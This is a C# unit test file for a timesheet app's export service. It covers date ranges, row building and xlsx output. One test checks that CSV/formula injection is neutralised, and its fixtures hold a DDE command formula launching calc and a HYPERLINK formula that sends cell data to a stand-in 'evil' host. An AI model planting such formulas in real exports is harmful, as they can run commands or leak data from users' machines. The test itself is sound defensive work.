using TimesheetTracker.DataModel.Enums;
using TimesheetTracker.DataModel.Services;
using TimesheetTracker.DataModel.Services.Export;

namespace DataModel.Tests.UnitTests;

[TestFixture]
public class ExportPeriodTests
{
    [Test]
    public void Week_StartsMonday_EndsSunday()
    {
        var (start, end) = ExportPeriod.Range(ExportScope.Week, new(2026, 6, 10)); // Wed
        start.Should().Be(new(2026, 6, 8));  // Mon
        end.Should().Be(new(2026, 6, 14));   // Sun
    }

    [Test]
    public void Month_CoversWholeMonth()
    {
        var (start, end) = ExportPeriod.Range(ExportScope.Month, new(2026, 2, 15));
        start.Should().Be(new(2026, 2, 1));
        end.Should().Be(new(2026, 2, 28));
    }

    [Test]
    public void FinancialYear_BeforeJuly_StartsPreviousJuly()
    {
        var (start, end) = ExportPeriod.Range(ExportScope.FinancialYear, new(2026, 3, 1));
        start.Should().Be(new(2025, 7, 1));
        end.Should().Be(new(2026, 6, 30));
    }

    [Test]
    public void FinancialYear_FromJuly_StartsSameYearJuly()
    {
        var (start, end) = ExportPeriod.Range(ExportScope.FinancialYear, new(2026, 8, 1));
        start.Should().Be(new(2026, 7, 1));
        end.Should().Be(new(2027, 6, 30));
    }
}

[TestFixture]
public class ExportServiceTests
{
    [Test]
    public Task BuildRows_ProducesExpectedColumns()
    {
        var service = new ExportService(new TimeCalculationService(), new HolidayService());
        var entries = new[]
        {
            new TimeEntry
            {
                WorkDate = new(2026, 12, 25),
                StartTime = new(9, 0),
                EndTime = new(17, 0),
                BreakMinutes = 30,
                Notes = "Worked the holiday"
            }
        };

        var rows = service.BuildRows(entries, new(AustralianState.NSW, 2));
        return Verify(rows);
    }

    [Test]
    public void BuildRows_MarksWorkFromHome()
    {
        var service = new ExportService(new TimeCalculationService(), new HolidayService());
        var entries = new[]
        {
            new TimeEntry
            {
                WorkDate = new(2026, 6, 10), StartTime = new(9, 0), EndTime = new(17, 0),
                BreakMinutes = 30, IsWorkFromHome = true,
            },
            new TimeEntry
            {
                WorkDate = new(2026, 6, 11), StartTime = new(9, 0), EndTime = new(17, 0),
                BreakMinutes = 30,
            },
        };

        var rows = service.BuildRows(entries, new(AustralianState.NSW, 2));

        rows[0].WorkFromHome.Should().Be("Yes");
        rows[1].WorkFromHome.Should().BeNull();
    }

    [Test]
    public void BuildRows_NeutralizesFormulaInjection()
    {
        var service = new ExportService(new TimeCalculationService(), new HolidayService());
        var prj = new ProjectCode { Code = "=cmd|'/c calc'!A1" };
        var entries = new[]
        {
            new TimeEntry
            {
                WorkDate = new(2026, 6, 10), StartTime = new(9, 0), EndTime = new(17, 0),
                BreakMinutes = 30, ProjectCode = prj, ProjectCodeId = prj.Id,
                Notes = "=HYPERLINK(\"http://evil/?\"&A1,\"x\")",
            },
            new TimeEntry
            {
                WorkDate = new(2026, 6, 11), StartTime = new(9, 0), EndTime = new(17, 0),
                BreakMinutes = 0, Notes = "+1+1", ProjectCode = new ProjectCode { Code = "PRJ-1" },
            },
        };

        var rows = service.BuildRows(entries, new(AustralianState.NSW, 2));

        // Dangerous leading char → prefixed with apostrophe so Excel treats it as text.
        rows[0].Notes.Should().StartWith("'=HYPERLINK");
        rows[0].ProjectCode.Should().Be("'=cmd|'/c calc'!A1");
        rows[1].Notes.Should().Be("'+1+1");
        // Safe values are untouched.
        rows[1].ProjectCode.Should().Be("PRJ-1");
    }

    [Test]
    public async Task ToWorkbookAsync_ProducesNonEmptyXlsx()
    {
        var service = new ExportService(new TimeCalculationService(), new HolidayService());
        var rows = service.BuildRows(
            [new()
                { WorkDate = new(2026, 6, 8), StartTime = new(9, 0), EndTime = new(17, 0), BreakMinutes = 30 }],
            new(AustralianState.NSW, 2));

        var bytes = await service.ToWorkbookAsync(rows);

        // .xlsx files are ZIP archives — first two bytes are "PK".
        bytes.Should().NotBeEmpty();
        bytes[0].Should().Be((byte)'P');
        bytes[1].Should().Be((byte)'K');
    }
}
